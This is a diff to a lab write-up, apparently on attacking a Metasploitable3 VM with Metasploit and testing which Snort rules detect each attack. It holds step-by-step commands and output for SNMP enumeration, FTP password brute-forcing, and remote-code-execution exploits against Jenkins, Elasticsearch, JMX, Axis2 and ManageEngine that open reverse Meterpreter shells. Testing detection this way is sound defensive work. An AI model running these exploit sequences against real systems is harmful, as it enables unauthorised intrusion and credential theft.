@@ -37,11 +37,13 @@ In the case of systems based solely on open source I would argue that it is alwa
 * ` msf > use auxiliary/scanner/snmp/snmp_enum `
 * ` msf auxiliary(snmp_enum) > set RHOSTS 192.168.78.2 `
 * ` msf auxiliary(snmp_enum) > exploit `
+~~~javascript
  ...
 *  [*] System information:
 * Host IP                       : 192.168.78.2
 * Hostname                      : metasploitable3
 * ...
+~~~
 * The snmp-scanner found 20 user accounts:
 * •	Administrator, Guest, anakin_skywalker, artoo_detoo, ben_kenobi, boba_fett, c_three_pio, chewbacca, darth_vader, greedo, han_solo, jabba_hutt, jarjar_binks, kylo_ren, lando_calrissian, leah_organa, luke_skywalker, sshd, sshd_server, vagrant
 * 2.2 snort
@@ -57,9 +59,11 @@ In the case of systems based solely on open source I would argue that it is alwa
 * ` msf auxiliary(ftp_login) > set PASS_FILE /opt/metasploit/data/wordlists/unix_passwords.txt`
 * ` msf auxiliary(ftp_login) > set USER_AS_PASS true`
 * ` msf auxiliary(ftp_login) > exploit`
+~~~javascript
  ...
 * [+] 192.168.78.2:21       - 192.168.78.2:21 - LOGIN SUCCESSFUL: Administrator:vagrant
 * [+] 192.168.78.2:21       - 192.168.78.2:21 - LOGIN SUCCESSFUL: vagrant:vagrant
+~~~
 * Detected credentials can be used in terminal-logins and for services like FTP, SSH, and others.
 * 3.2 snort
 * Snort does not detecting bruteforcing of FTP other than monitoring rate of logins and that could be avoided by limiting the attack rate.
@@ -70,13 +74,15 @@ In the case of systems based solely on open source I would argue that it is alwa
 * ` msf exploit(jenkins_script_console) > set RPORT 8484`
 * ` msf exploit(jenkins_script_console) > set TARGETURI /`
 * ` msf exploit(jenkins_script_console) > exploit`
+~~~javascript
  ...
 * [*] Sending stage (957487 bytes) to 192.168.78.2
 * [*] Command Stager progress - 100.00% done (99626/99626 bytes)
 * [*] Meterpreter session 1 opened (172.28.128.1:4444 -> 192.168.78.2:49644) at 2017-04-09 18:04:14 +0300
 
-* ` meterpreter > getuid`
+*  meterpreter > getuid
 * Server username: NT AUTHORITY\LOCAL SERVICE
+~~~
  4.2 snort
 * Enabling app-detect.rules:172, server-other.rules:1436 and changing the URI from "/jenkins/" to "/" produced:
 * APP-DETECT Jenkins Groovy script access through script console attempt [**] [Classification: Potential Corporate Privacy Violation]
@@ -85,6 +91,7 @@ In the case of systems based solely on open source I would argue that it is alwa
 * ` msf > use exploit/multi/elasticsearch/script_mvel_rce`
 * ` msf exploit(script_mvel_rce) > set RHOST 192.168.78.2`
 * ` msf exploit(script_mvel_rce) > exploit`
+~~~javascript
 ...
 * [*] Trying to execute arbitrary Java...
 * [*] Discovering remote OS...
@@ -97,6 +104,7 @@ In the case of systems based solely on open source I would argue that it is alwa
 
 *` meterpreter > getuid`
 * Server username: METASPLOITABLE3$
+~~~
 5.2 snort
 * Enabling server-other.rules:812,1336 produces:
 * SERVER-OTHER ElasticSearch script remote code execution attempt [**] [Classification: Attempted User Privilege Gain]
@@ -106,6 +114,7 @@ In the case of systems based solely on open source I would argue that it is alwa
 * ` msf exploit(java_jmx_server) > set RHOST 192.168.78.2`
 * ` msf exploit(java_jmx_server) > set RPORT 1617`
 * ` msf exploit(java_jmx_server) > exploit`
+~~~javascript
 ...
 * [+] 192.168.78.2:1617 - Handshake with JMX MBean server on 192.168.78.2:49202
 * [*] 192.168.78.2:1617 - Loading payload...
@@ -116,6 +125,7 @@ In the case of systems based solely on open source I would argue that it is alwa
 
 * meterpreter > getuid
 * Server username: LOCAL SERVICE
+~~~
 6.2 snort
 * Enabling server-other.rules:177,1346 produces:
 * SERVER-OTHER Oracle Java JMX server insecure configuration remote code execution attempt [**] [Classification: Attempted User Privilege Gain]
@@ -129,7 +139,7 @@ In the case of systems based solely on open source I would argue that it is alwa
 * ` msf exploit(axis2_deployer) > set target 1`
 * ` msf exploit(axis2_deployer) > set payload java/meterpreter/reverse_tcp`
 * ` msf exploit(axis2_deployer) > exploit`
-
+~~~javascript
 * [*] Started reverse TCP handler on 172.28.128.1:4444
 * [+] http://192.168.78.2:8282/axis2/axis2-admin [Apache-Coyote/1.1] [Axis2 Web Admin Module] successful login 'admin' : 'axis2'
 * [*] Successfully uploaded
@@ -140,6 +150,7 @@ In the case of systems based solely on open source I would argue that it is alwa
 
 * ` meterpreter > getuid`
 * Server username: METASPLOITABLE3$
+~~~
 7.2 snort
 * Enabling server-other.rules:1451 and policy-other.rules:84,115-116
 * POLICY-OTHER HP Universal CMDB default credentials authentication attempt [**] [Classification: Potential Corporate Privacy Violation]
@@ -151,7 +162,7 @@ In the case of systems based solely on open source I would argue that it is alwa
 * ` msf exploit(manageengine_connectionid_write) > set RHOST 192.168.78.2 `
 * ` msf exploit(manageengine_connectionid_write) > set RPORT 8022 `
 * ` msf exploit(manageengine_connectionid_write) > exploit `
-
+~~~javascript
 * [*] Started reverse TCP handler on 172.28.128.1:4444
 * [*] Creating JSP stager
 * [*] Uploading JSP stager vSkNT.jsp...
@@ -160,8 +171,9 @@ In the case of systems based solely on open source I would argue that it is alwa
 * [*] Meterpreter session 3 opened (172.28.128.1:4444 -> 192.168.78.2:53235) at 2017-04-09 22:34:31 +0300
 * [+] Deleted ../webapps/DesktopCentral/jspf/vSkNT.jsp
 
-* ` meterpreter > getuid`
+*  meterpreter > getuid
 * Server username: NT AUTHORITY\LOCAL SERVICE
+~~~
 8.2 snort
 * Enabling rules/server-webapp.rules:1853-1855
 * SERVER-WEBAPP ManageEngine Desktop Central FileUploadServlet directory traversal attempt [**] [Classification: Web Application Attack]
